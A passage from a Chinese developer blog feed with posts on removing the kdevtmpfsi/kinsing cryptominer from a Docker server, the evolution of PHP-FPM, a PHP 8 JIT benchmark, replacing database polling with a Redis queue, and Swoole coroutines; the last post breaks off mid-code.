        <content type="html"><![CDATA[<p>昨天有台测试服务器被告知服务异常，进服务器之后才发现是因为docker 异常退出了。</p><a id="more"></a><p>将docker 运行起来之后，发现有个不认识的进程 <code>kdevtmpfsi</code> 占用CPU 异常的多，Google 一下才知道，好家伙，服务器被当成矿机了。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20201204164931.png" alt=""></p><p>直接 kill 并不能将其结束掉，它还有守护进程及可能存在的定时任务。</p><h3 id="1-首先查找文件"><a href="#1-首先查找文件" class="headerlink" title="1. 首先查找文件"></a>1. 首先查找文件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ find &#x2F; -name kinsing      &#x2F;&#x2F; 守护进程</span><br><span class="line">$ find &#x2F; -name kdevtmpfsi   &#x2F;&#x2F; 挖矿进程</span><br></pre></td></tr></table></figure><p>如果Redis 是运行在本地，上面两个文件通常是在<code>/tmp/</code>目录下。</p><p>如果Redis 是以容器的方式运行，则通常是在<code>/var/lib/docker/overlay2/</code>（容器的 <code>/tmp/</code> 目录）下。</p><h3 id="2-将其删除"><a href="#2-将其删除" class="headerlink" title="2. 将其删除"></a>2. 将其删除</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ rm -f kinsing kdevtmpfsi</span><br></pre></td></tr></table></figure><p>这里被感染的容器也不一定是Redis ，比如我的则是PHP，所以需要进入到被感染的容器内才能找到。</p><h3 id="3-干掉进程"><a href="#3-干掉进程" class="headerlink" title="3. 干掉进程"></a>3. 干掉进程</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ ps -aux | grep kinsing</span><br><span class="line">$ ps -aux | grep kdevtmpfsi</span><br><span class="line">$ kill -9 pid</span><br></pre></td></tr></table></figure><h3 id="4-查看定时任务"><a href="#4-查看定时任务" class="headerlink" title="4. 查看定时任务"></a>4. 查看定时任务</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ crontab -l</span><br></pre></td></tr></table></figure><p>存在定时任务的不一定是当前用户，可以使用以下命令查找其他用户是否存在任务：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ for user in $(cut -f1 -d: &#x2F;etc&#x2F;passwd); do crontab -u $user -l; done</span><br></pre></td></tr></table></figure><p>定时任务还可能存在于以下地方：</p><ol><li><code>/etc/crontab</code></li><li><code>/var/spool/cron/</code></li><li><code>/var/spool/cron/crontabs/</code></li></ol><p>至此就完成了病毒的清理，网上千篇一律的全是这种处理方式，但这个方式并不适合我，我尝试了很多次，无论我怎么删除，病毒还是存在。</p><p>因为病毒是依赖于容器生存的，于是我便将容器停止掉，通过<code>docker logs</code> 实时查看容器最后10条日志：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker logs -f -t --tail 10 &lt;容器id&#x2F;容器名称&gt;</span><br></pre></td></tr></table></figure><p>十分钟之后，总算让我逮到了：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20201204172650.png" alt=""></p><p>虽然目睹了全过程，但这时我依然无能为力，因为我不知道上面那些命令是如何自动启动的。</p><p>尝试了各种方式，但都无解，十分钟之后病毒还是会出来，最终我只能把这个被感染的容器给弃用了，重新起一个新的容器。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p><code>kdevtmpfsi</code>病毒的产生，通常是因为Redis 对外开放 <code>6379</code>端口，且没设置密码或者密码过于简单导致。</p><p>所以服务器一定要设置好防火墙，像<code>3306</code>、<code>6379</code> 这种常用端口，尽量减少对外开放的机会。</p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://vms.drweb.cn/virus/?i=19722604&lng=cn" target="_blank" rel="noopener">Linux.Packed.753</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> 运维 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP-FPM 进化史</title>
      <link href="/the-evolution-of-php-fpm/"/>
      <url>/the-evolution-of-php-fpm/</url>
      
        <content type="html"><![CDATA[<p>最近有幸读到<a href="http://blog.leanote.com/post/weibo-007/%E4%BB%8ECGI%E5%88%B0FastCGI%E5%88%B0PHP-FPM" target="_blank" rel="noopener">一篇文章</a>，一文将CGI 的进化史讲的特别详细，虽然我自己之前也整理过 <a href="https://www.0x2beace.com/what-is-the-relationship-between-php-fpm-and-nginx/">CGI、FastCGI、PHP-FPM 相关的笔记</a>，但是并没有从原理的角度来认识 CGI。</p><a id="more"></a><h2 id="CGI-的诞生"><a href="#CGI-的诞生" class="headerlink" title="CGI 的诞生"></a>CGI 的诞生</h2><p>早些年的Web 应用很简单，客户端通过浏览器发起请求，服务端直接返回响应。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20201202210831.png" alt=""></p><p>随着互联网的发展，简单的Web 应用已经不能满足开发者们了。<br>我们希望Web服务器有更多的功能，飞速发展的同时还能让不同语言的开发者也能加入。</p><p><a href="https://www.ietf.org/rfc/rfc3875" target="_blank" rel="noopener">CGI协议</a>协议的诞生就是 Web服务器和其他领域的开发者在保证遵守协议的基础上，剩下的可以自由发挥，而实现这个协议的脚本叫做CGI 程序。</p><p>CGI协议规定了需要向CGI脚本设置的环境变量和一些其他信息，CGI程序完成某一个功能，可以用PHP，Python，Shell或者C语言编写。</p><p>在没有CGI 之前，其他语言如果需要接入Mysql 或者Memcache，还需要使用C 语言，但有了CGI协议，我们的Web处理流程可以变成下图这样：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20201202211748.png" alt=""></p><h2 id="FastCGI-的诞生"><a href="#FastCGI-的诞生" class="headerlink" title="FastCGI 的诞生"></a>FastCGI 的诞生</h2><p>CGI程序存在致命的缺点：每当客户端发起请求，服务器将请求转发给CGI，WEB 服务器就请求操作系统生成一个新的CGI解释器进程(如php-cgi），CGI进程则处理完一个请求后退出，下一个请求来时再创建新进程。</p><p>我们知道，执行一个PHP程序的必须要先解析<code>php.ini</code>文件，然后模块初始化等等一系列工作，每次都反复这样非常浪费资源。</p><p><a href="http://andylin02.iteye.com/blog/648412" target="_blank" rel="noopener">FastCGI协议</a>在CGI协议的基础上，做出了如下改变：</p><ol><li>FastCGI被设计用来支持常驻（<code>long-lived</code>）应用进程，减少了<code>fork-and-execute</code>带来的开销</li><li>FastCGI进程通过监听的socket，收来自Web服务器的连接，这样FastCGI 进程可以独立部署</li><li>服务器和FastCGI监听的socket 之间按照消息的形式发送环境变量和其他数据</li></ol><p>我们称实现了FastCGI协议的程序为FastCGI程序，FastCGI程序的交互方式如下图所示：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20201202212619.png" alt=""></p><h2 id="PHP-FPM-的诞生"><a href="#PHP-FPM-的诞生" class="headerlink" title="PHP-FPM 的诞生"></a>PHP-FPM 的诞生</h2><p>FastCGI 程序固然已经很好了，但我们的需求总是有点苛刻，它还是存在一些明显缺点的：</p><ol><li>当我们更改配置文件(<code>php.ini</code>)后，<code>php-cgi</code>（FastCGI 程序） 无法平滑重启</li><li>我们fork的进程个数和请求量正比，请求繁忙时 fork 进程多，动态调整 <code>php-cgi</code>还没做到</li></ol><p>上面提及php-cgi 实现的FastCGI问题官方没有解决，幸运的是有第三方帮我们解决了，它就是 <code>php-fpm</code>。</p><p>它可以独立运行，不依赖php-cgi，换句话说，它自己实现了FastCGI协议并且支持进程平滑重启且带进程管理功能。</p><p>进程包含 <code>master</code> 进程和 <code>worker</code> 进程两类进程。</p><p><code>master</code> 进程只有一个，负责监听端口，接收来自Web Server 的请求，而 <code>worker</code> 进程则一般有多个（具体数量根据实际需要配置），每个进程内部都嵌入了一个PHP 解释器，是PHP 代码正真执行的地方。</p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="http://blog.leanote.com/post/weibo-007/%E4%BB%8ECGI%E5%88%B0FastCGI%E5%88%B0PHP-FPM" target="_blank" rel="noopener">从CGI到FastCGI到PHP-FPM</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> PHP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> PHP-FPM </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP 8.0 初体验</title>
      <link href="/php-8-0-first-experience/"/>
      <url>/php-8-0-first-experience/</url>
      
        <content type="html"><![CDATA[<p>昨天使用 homebrew 安装软件时，结果把我本地已安装的软件中能更新的全部给更新了一遍。</p><a id="more"></a><p>这其中就包括 <code>php8.0</code>。在<code>8.0</code> 正式出来之前，有听说过加入了新特性：JIT编译。</p><p>从理论上讲，JIT处理PHP脚本编译的方式能够提高应用程序的速度，但究竟能有多快呢？下面通过一个简单的例子来看看。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$startTime &#x3D; microtime(true);</span><br><span class="line">$mysqli &#x3D; new Mysqli(&quot;127.0.0.1&quot;, &quot;root&quot;, &quot;root&quot;);</span><br><span class="line"></span><br><span class="line">function doSomething($db,$i)</span><br><span class="line">&#123;</span><br><span class="line">$hash &#x3D; md5($i);</span><br><span class="line">$db-&gt;query(&quot;INSERT INTO local.test(id, hash) VALUES($i, \&quot;$hash\&quot;)&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$i &#x3D; 1;</span><br><span class="line">while ($i&lt;100000) &#123;</span><br><span class="line">doSomething($mysqli, $i);</span><br><span class="line">$i++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$total &#x3D; microtime(true) - $startTime;</span><br><span class="line">var_dump(&quot;总耗时：&#123;$total&#125;秒&quot;);</span><br></pre></td></tr></table></figure><p>这里只是简单的向数据库不重复插入十万条数据。<br>我知道用这个脚本举例子并不好，但它却是离我日常使用最近的。</p><p><code>php7.3</code> 测试结果：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20201201000322.png" alt=""></p><p><code>php8.0</code> 未开启 JIT 扩展测试结果：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20201201000427.png" alt=""></p><p><code>php8.0</code> 已开启 JIT 扩展测试结果：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20201201000725.png" alt=""></p><p>可以看到相比 7.3，足足快了近三分之一！</p><p>当然这个测试结果严格意义上来讲，并不准确，但看到数字从四十多秒缩短到三十秒，还是很惊喜的。</p><p>我的电脑配置：</p><ul><li>3.5 GHz 双核Intel Core i7</li><li>16 GB RAM</li></ul>]]></content>
      
      
      <categories>
          
          <category> PHP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记一次 Linux 服务器性能调优</title>
      <link href="/remember-a-Linux-server-performance-tuning/"/>
      <url>/remember-a-Linux-server-performance-tuning/</url>
      
        <content type="html"><![CDATA[<p>轮询查 Db 对服务器（数据库）的压力究竟有多大？</p><a id="more"></a><p>前段时间接手一个老系统，其中对于“订单”的处理，非常原始且简单粗暴。</p><p>直接通过一个 PHP 脚本不断轮询查询数据库，直到查找到需要处理的“订单”才去处理，否则一直查找。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">function doSomething()&#123;</span><br><span class="line">    &#x2F;&#x2F; 查询数据库</span><br><span class="line">    if ($exists)&#123;</span><br><span class="line">        &#x2F;&#x2F; todo</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">while(true)&#123;</span><br><span class="line">    doSomething();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>类似的处理还有其他几个脚本。</p><p>因为项目的历史包袱较重，也不好做一些大调整，起初我并没有太在意，就直接部署到服务器上了。</p><p>就在最近，我收到反馈，系统有问题。通过一系列排查最后发现是因为“订单”处理不及时，“订单”堆积过多导致的一系列问题。</p><p>我寻思着，用户量也没有很多，为什么会处理不完呢？使用 glances 命令看了一眼。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20201130214211.png" alt=""></p><p>这不看不知道，一看吓一跳，CPU 直接警告了。无论多好的机器也经受不住这样折腾，赶紧把轮询查表的方式改成了查队列。</p><p>基于Redis 的List 实现一个简单的消息队列，更新到服务器之后，可以看到CPU 直接降了一半。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20201130213713.png" alt=""></p><p>为什么使用Redis 会比Mysql 的效果要好？</p><p>通俗一点解释是因为Redis 存储是基于内存，Mysql 存储是基于磁盘，而内存的读写要比磁盘快不止一个数量级。</p><p>当然，上面的处理方式并不是最优的，这里只是单论如何发现性能瓶颈，以及如何调优这一点来进行说明。</p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
          <category> PHP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> Mysql </tag>
            
            <tag> Linux </tag>
            
            <tag> 运维 </tag>
            
            <tag> Redis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Swoole 协程学习</title>
      <link href="/swoole-coroutine-learning/"/>
      <url>/swoole-coroutine-learning/</url>
      
        <content type="html"><![CDATA[<p>第一次接触协程这个概念，是在学习Swoole时，那时看官方文档并不能完全理解协程到底是个什么东西以及该如何正确的使用它。</p><a id="more"></a><p>后来逐渐看了一些写的比较通俗的文章，加上自己的一些理解，逐步开始对协程有一些认识了。</p><h2 id="认识协程"><a href="#认识协程" class="headerlink" title="认识协程"></a>认识协程</h2><p><strong>协程不是进程或线程</strong>，其执行过程更类似于子例程，或者说不带返回值的函数调用。</p><p>上面那句话很关键，一句话就把协程是什么，不是什么说清楚了。</p><p>下面这张图可以很清晰的看到协程与多进程的区别：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20201129093350.png" alt=""></p><h3 id="执行顺序"><a href="#执行顺序" class="headerlink" title="执行顺序"></a>执行顺序</h3><p>下面这段代码主要做了三件事：写入文件、发送邮件以及插入数据。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function task1()&#123;</span><br><span class="line">    for ($i&#x3D;0;$i&lt;&#x3D;300;$i++)&#123;</span><br><span class="line">        &#x2F;&#x2F;写入文件,大概要3000微秒</span><br><span class="line">        usleep(3000);</span><br><span class="line">        echo &quot;写入文件&#123;$i&#125;\n&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">function task2()&#123;</span><br><span class="line">    for ($i&#x3D;0;$i&lt;&#x3D;500;$i++)&#123;</span><br><span class="line">        &#x2F;&#x2F;发送邮件给500名会员,大概3000微秒</span><br><span class="line">        usleep(3000);</span><br><span class="line">        echo &quot;发送邮件&#123;$i&#125;\n&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">function task3()&#123;</span><br><span class="line">    for ($i&#x3D;0;$i&lt;&#x3D;100;$i++)&#123;</span><br><span class="line">        &#x2F;&#x2F;模拟插入100条数据,大概3000微秒</span><br><span class="line">        usleep(3000);</span><br><span class="line">        echo &quot;插入数据&#123;$i&#125;\n&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">task1();</span><br><span class="line">task2();</span><br><span class="line">task3();</span><br></pre></td></tr></table></figure><p>这段代码和上面不同的是，这三件事情是交叉执行的，每个任务执行完一次之后，切换到另一个任务，如此循环。</p><p>类似于这样的执行顺序，就是协程。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function task1($i)</span><br><span class="line">&#123;</span><br><span class="line">&#x2F;&#x2F;使用$i标识 写入文件,大概要3000微秒</span><br><span class="line">if ($i &gt; 300) &#123;</span><br><span class="line">return false;&#x2F;&#x2F;超过300不用写了</span><br><span class="line">&#125;</span><br><span class="line">echo &quot;写入文件&#123;$i&#125;\n&quot;;</span><br><span class="line">usleep(3000);</span><br><span class="line">return true;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function task2($i)</span><br><span class="line">&#123;</span><br><span class="line">&#x2F;&#x2F;使用$i标识 发送邮件,大概要3000微秒</span><br><span class="line">if ($i &gt; 500) &#123;</span><br><span class="line">return false;&#x2F;&#x2F;超过500不用发送了</span><br><span class="line">&#125;</span><br><span class="line">echo &quot;发送邮件&#123;$i&#125;\n&quot;;</span><br><span class="line">usleep(3000);</span><br><span class="line">return true;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function task3($i)</span><br><span class="line">&#123;</span><br><span class="line">&#x2F;&#x2F;使用$i标识 插入数据,大概要3000微秒</span><br><span class="line">if ($i &gt; 100) &#123;</span><br><span class="line">return false;&#x2F;&#x2F;超过100不用插入</span><br><span class="line">&#125;</span><br><span class="line">echo &quot;插入数据&#123;$i&#125;\n&quot;;</span><br><span class="line">usleep(3000);</span><br><span class="line">return true;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$i &#x3D; 0;</span><br><span class="line">while (true) &#123;</span><br><span class="line">$task1Result &#x3D; task1($i);</span><br><span class="line">$task2Result &#x3D; task2($i);</span><br><span class="line">$task3Result &#x3D; task3($i);</span><br><span class="line">if($task1Result&#x3D;&#x3D;&#x3D;false&amp;&amp;$task2Result&#x3D;&#x3D;&#x3D;false&amp;&amp;$task3Result&#x3D;&#x3D;&#x3D;false)&#123;</span><br><span class="line">break;&#x2F;&#x2F;全部任务完成,退出循环</span><br><span class="line">&#125;</span><br><span class="line">$i++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>swoole实现协程代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function task1()&#123;</span><br><span class="line">    for ($i&#x3D;0;$i&lt;&#x3D;300;$i++)&#123;</span><br><span class="line">        &#x2F;&#x2F;写入文件,大概要3000微秒</span><br><span class="line">        usleep(3000);</span><br><span class="line">        echo &quot;写入文件&#123;$i&#125;\n&quot;;</span><br><span class="line">        Co::sleep(0.001);&#x2F;&#x2F;挂起当前协程,0.001秒后恢复&#x2F;&#x2F;相当于切换协程</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">function task2()&#123;</span><br><span class="line">    for ($i&#x3D;0;$i&lt;&#x3D;500;$i++)&#123;</span><br><span class="line">        &#x2F;&#x2F;发送邮件给500名会员,大概3000微秒</span><br><span class="line">        usleep(3000);</span><br><span class="line">        echo &quot;发送邮件&#123;$i&#125;\n&quot;;</span><br><span class="line">        Co::sleep(0.001);&#x2F;&#x2F;挂起当前协程,0.001秒后恢复&#x2F;&#x2F;相当于切换协程</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">function task3()&#123;</span><br><span class="line">    for ($i&#x3D;0;$i&lt;&#x3D;100;$i++)&#123;</span><br><span class="line">        &#x2F;&#x2F;模拟插入100条数据,大概3000微秒</span><br><span class="line">        usleep(3000);</span><br><span class="line">        echo &quot;插入数据&#123;$i&#125;\n&quot;;</span><br><span class="line">        Co::sleep(0.001);&#x2F;&#x2F;挂起当前协程,0.001秒后恢复&#x2F;&#x2F;相当于切换协程</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$pid1 &#x3D; go(&#39;task1&#39;);&#x2F;&#x2F;go函数是swoole的开启协程函数，用于开启一个协程</span><br><span class="line">$pid2 &#x3D; go(&#39;task2&#39;);</span><br><span class="line">$pid3 &#x3D; go(&#39;task3&#39;);</span><br></pre></td></tr></table></figure><h3 id="协程与多进程"><a href="#协程与多进程" class="headerlink" title="协程与多进程"></a>协程与多进程</h3><p>由上面的代码，可以发现，协程其实只是运行在一个进程中的函数，只是这个函数会被切换到下一个执行。</p><blockquote><p>需要注意的是⚠️：</p></blockquote><p>协程并不是多任务并行处理，它属于多任务串行处理，它俩的本质区别是在某个时刻同时执行一个还是多个任务。</p><h3 id="协程的作用域"><a href="#协程的作用域" class="headerlink" title="协程的作用域"></a>协程的作用域</h3><p>由于协程就是进程中一串任务代码，所以它的全局变量、静态变量等变量都是共享的，包括 PHP 的全局缓冲区。</p><p>所以在开发时特别需要注意作用域相关的问题。</p><h3 id="协程的I-O连接"><a href="#协程的I-O连接" class="headerlink" title="协程的I/O连接"></a>协程的I/O连接</h3><p>在协程中，要特别注意不能共用一个 I/O 连接，否则会造成数据异常。</p><p>由于协程的交叉运行机制，且各个协程的 I/O 连接都必须是相互独立的，这时如果使用传统的直接建立连接方式，会导致每个协程都需要建立连接、闭关连接，从而消耗大量资源。那么该如何解决协程的 I/O 连接问题呢？这个时候就需要用到连接池了。</p><p>连接池存在的意义在于，复用原来的连接，从而节省重复建立连接所带来的开销。</p><h3 id="协程的实际应用场景"><a href="#协程的实际应用场景" class="headerlink" title="协程的实际应用场景"></a>协程的实际应用场景</h3><p>说了这么多，那协程倒底能解决哪些实际业务场景呢？下面通过一个实例来快速上手协程（笔者当时写这篇文章时，对协程的理解还不够深刻，所以这里引用<a href="https://learnku.com/blog/zxr615" target="_blank" rel="noopener">zxr615</a> 的”<a href="https://learnku.com/articles/44836" target="_blank" rel="noopener">做饭</a>“的例子来理解协程）：</p><p>传统同步阻塞实现逻辑：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function cook()</span><br><span class="line">&#123;</span><br><span class="line">$startTime &#x3D; time();</span><br><span class="line"></span><br><span class="line">echo &quot;开始煲汤...&quot; . PHP_EOL;</span><br><span class="line">sleep(10);</span><br><span class="line">echo &quot;汤好了...&quot; . PHP_EOL;</span><br><span class="line"></span><br><span class="line">echo &quot;开始煮饭...&quot; . PHP_EOL;</span><br><span class="line">sleep(8);</span><br><span class="line">echo &quot;饭熟了...&quot; . PHP_EOL;</span><br><span class="line"></span><br><span class="line">echo &quot;放油...&quot; . PHP_EOL;</span><br><span class="line">sleep(1);</span><br><span class="line">echo &quot;煎鱼...&quot; . PHP_EOL;</span><br><span class="line">sleep(3);</span><br><span class="line">echo &quot;放盐...&quot; . PHP_EOL;</span><br><span class="line">sleep(1);</span><br><span class="line">echo &quot;出锅...&quot; . PHP_EOL;</span><br><span class="line"></span><br><span class="line">var_dump(&#39;总耗时：&#39; . (time() - $startTime) . &#39; 分钟&#39;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">cook();</span><br></pre></td></tr></table></figure><p>协程实现逻辑：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">use Swoole\Coroutine;</span><br><span class="line">use Swoole\Coroutine\WaitGroup;</span><br><span class="line">use Swoole;</span><br><span class="line"></span><br><span class="line">class Cook</span><br><span class="line">&#123;</span><br><span class="line">public function cookByCo()</span><br><span class="line">&#123;</span><br><span class="line">$startTime &#x3D; time();</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 开启一键协程化: https:&#x2F;&#x2F;wiki.swoole.com&#x2F;#&#x2F;runtime?id&#x3D;swoole_hook_all</span><br><span class="line">Swoole\Runtime::enableCoroutine($flags &#x3D; SWOOLE_HOOK_ALL);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 创建一个协程容器: https:&#x2F;&#x2F;wiki.swoole.com&#x2F;#&#x2F;coroutine&#x2F;scheduler</span><br><span class="line">&#x2F;&#x2F; 相当于进入厨房</span><br><span class="line">\Co\run(function () &#123;</span><br><span class="line">&#x2F;&#x2F; 等待结果: https:&#x2F;&#x2F;wiki.swoole.com&#x2F;#&#x2F;coroutine&#x2F;wait_group?id&#x3D;waitgroup</span><br><span class="line">&#x2F;&#x2F; 记录哪道菜做好了，哪道菜还需要多长时间</span><br><span class="line">$wg &#x3D; new 